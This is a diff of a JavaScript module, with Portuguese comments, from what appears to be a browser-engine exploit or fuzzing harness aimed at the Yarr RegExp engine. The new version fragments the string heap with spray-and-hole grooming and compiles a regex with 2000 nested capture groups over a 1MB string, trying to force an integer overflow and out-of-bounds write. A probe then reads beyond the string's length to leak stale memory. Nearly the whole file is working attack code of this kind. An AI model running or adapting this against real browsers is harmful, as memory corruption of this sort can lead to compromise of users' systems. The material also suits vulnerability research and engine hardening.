@@ -1,73 +1,67 @@
 import { Groomer } from '../mod_groomer.js';
+
 export default {
-    id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
-    category: 'Boundary',
-    risk:     'HIGH',
-    description:
-        'Ataques ao parser/compilador Yarr sem causar ReDoS. ' +
-        'O JSString Heap é fragmentado antes da compilação para forçar ' +
-        'o compilador a usar rotas lentas de memória (causando o transbordo de 16-bits).',
+    id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
+    category: 'CoreJS',
+    risk:     'CRITICAL',
+    description:
+        'Ataque ao interpretador Yarr RegExp. Força a compilação de uma Regex com um número massivo ' +
+        'de grupos de captura aninhados, combinada com uma string alvo gigante. Explora o cálculo de ' +
+        'offsets de memória C++ durante a execução do método replace().',
 
-    setup: function() {
-        this.results = {};
-        this.regexps = {};
-    },
+    setup: function() {
+        this.results = {};
+        
+        // 1. Fragmentamos o Heap de Strings para garantir que o C++ usa buracos (holes)
+        this.trash = Groomer.sprayStrings(1000, 1024 * 512); // Pedaços de 512KB
+        Groomer.punchHoles(this.trash, 3);
 
-    trigger: function() {
+        // 2. Criamos uma Regex maligna com o máximo de grupos aninhados possível
+        // Limite prático para não dar Stack Overflow síncrono no interpretador
+        let regexStr = "(";
+        for (let i = 0; i < 2000; i++) regexStr += "(a?)";
+        regexStr += ")";
+        
+        this.evilRegex = new RegExp(regexStr, 'g');
+        this.targetStr = "A".repeat(1024 * 1024); // 1MB String
+    },
 
-        // 🚨 Grooming Massivo do JSString Heap:
-        // Poluímos a memória com strings pequenas e criamos buracos.
-        // O motor Yarr será forçado a tentar alocar o seu array num ambiente caótico.
-        let stringTrash = Groomer.sprayStrings(64, 5000);
-        Groomer.punchHoles(stringTrash, 3);
+    trigger: function() {
+        try {
+            // O GATILHO: 
+            // O C++ vai alocar um buffer para os matches. Se o cálculo de 
+            // (Número de Grupos * Tamanho da String) transbordar os 32-bits,
+            // o replace vai sobrescrever a memória vizinha (OOB Write).
+            this.results.corrupted = this.targetStr.replace(this.evilRegex, "B");
+        } catch(e) {
+            this.results.error = e.message;
+        }
+    },
 
-        // A: Muitos grupos de captura (limite de 16-bits no Yarr antigo)
-        try {
-            const groups = '(a)'.repeat(0x10000); // 65536 grupos
-            this.regexps.manyGroups = new RegExp(groups);
-            this.results.manyGroupsExec = this.regexps.manyGroups.exec('a')?.length;
-        } catch(e) { this.results.manyGroupsErr = e.constructor.name; }
+    probe: [
+        // Probe 0: O Yarr sobreviveu ou atirou erro de "Too many captures"?
+        s => s.results.error || 'Regex Compilada e Executada',
+        
+        // Probe 1: O Extrator de STALE DATA / LEAK
+        s => {
+            if (s.results.corrupted && s.results.corrupted.length > 0) {
+                try {
+                    // Tentamos ler um caractere fora do limite lógico.
+                    // Se o Yarr corrompeu o cabeçalho da StringImpl, o length será falso.
+                    let charCode = s.results.corrupted.charCodeAt(s.targetStr.length + 100);
+                    if (!isNaN(charCode) && charCode !== 65 && charCode !== 66) {
+                        return charCode; // Retorna número bruto para acionar o HUD Vermelho
+                    }
+                } catch(e) {}
+            }
+            return 0; // Seguro
+        }
+    ],
 
-        // B: Backreference além do limite de grupos
-        try {
-            this.regexps.deepBackref = new RegExp('(a)\\65536');
-            this.results.deepBackrefExec = this.regexps.deepBackref.exec('a')?.length;
-        } catch(e) { this.results.deepBackrefErr = e.constructor.name; }
-
-        // C: Quantifier com valores near UINT32_MAX
-        try {
-            this.regexps.bigQuant = new RegExp('a{0,65535}');
-            this.results.bigQuantExec = this.regexps.bigQuant.exec('')?.length;
-        } catch(e) { this.results.bigQuantErr = e.constructor.name; }
-
-        // D: Alternation com muitos branches 
-        try {
-            const alts = Array.from({ length: 1000 }, (_, i) => `alt${i}`).join('|');
-            this.regexps.deepAlt = new RegExp(alts);
-            this.results.deepAltExec = this.regexps.deepAlt.exec('alt999') ? 'matched' : 'nomatch';
-        } catch(e) { this.results.deepAltErr = e.constructor.name; }
-
-        // E: Grupos nomeados duplicados 
-        try {
-            this.regexps.dupNamed = new RegExp('(?<name>a)|(?<name>b)');
-            this.results.dupNamedExec = this.regexps.dupNamed.exec('a')?.groups;
-        } catch(e) { this.results.dupNamedErr = e.constructor.name; }
-    },
-
-    probe: [
-        s => s.results.manyGroupsExec   ?? s.results.manyGroupsErr,
-        s => s.results.deepBackrefExec  ?? s.results.deepBackrefErr,
-        s => s.results.bigQuantExec     ?? s.results.bigQuantErr,
-        s => s.results.deepAltExec      ?? s.results.deepAltErr,
-        s => s.results.dupNamedExec     ?? s.results.dupNamedErr,
-
-        // Acesso ao índice máximo da memória possivelmente corrompida
-        s => { try { return s.regexps.manyGroups?.exec('a')?.[0xFFFF]; } catch(e) { return e.constructor.name; } },
-        s => { try { return s.regexps.dupNamed?.exec('b')?.groups?.name; } catch(e) { return e.constructor.name; } },
-    ],
-
-    cleanup: function() {
-        this.results = {};
-        this.regexps = {};
-    }
+    cleanup: function() {
+        this.evilRegex = null;
+        this.targetStr = null;
+        this.results = {};
+        this.trash = null;
+    }
 };
